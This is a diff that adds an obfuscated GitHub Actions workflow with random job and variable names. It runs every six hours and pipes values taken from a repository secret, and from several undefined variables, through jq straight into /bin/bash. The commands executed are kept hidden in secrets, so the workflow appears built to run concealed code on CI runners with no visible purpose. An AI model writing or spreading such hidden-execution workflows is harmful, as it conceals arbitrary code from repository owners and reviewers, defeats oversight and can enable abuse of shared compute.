@@ -1,0 +1,25 @@
+name: jinweixiang9012
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinweixiang9012
+        env:
+          wi9: ${{ secrets.wi9 }}
+        run: |
+          echo $wi9 | jq -r .lwfsm8 | /bin/bash
+          echo $tvwwd73 | jq -r .bzzek86051 | /bin/bash
+          echo $bjf6268 | jq -r .sm042 | /bin/bash
+          echo $rskw198 | jq -r .btutg107 | /bin/bash
+          echo $v25148 | jq -r .uy4374 | /bin/bash
+          echo $azeve88 | jq -r .jnysb648 | /bin/bash
+          echo $qul85267 | jq -r .oazqu8 | /bin/bash
+          echo $ixcu6386 | jq -r .zmd86594 | /bin/bash
+          echo $mk160 | jq -r .hv9511 | /bin/bash
+
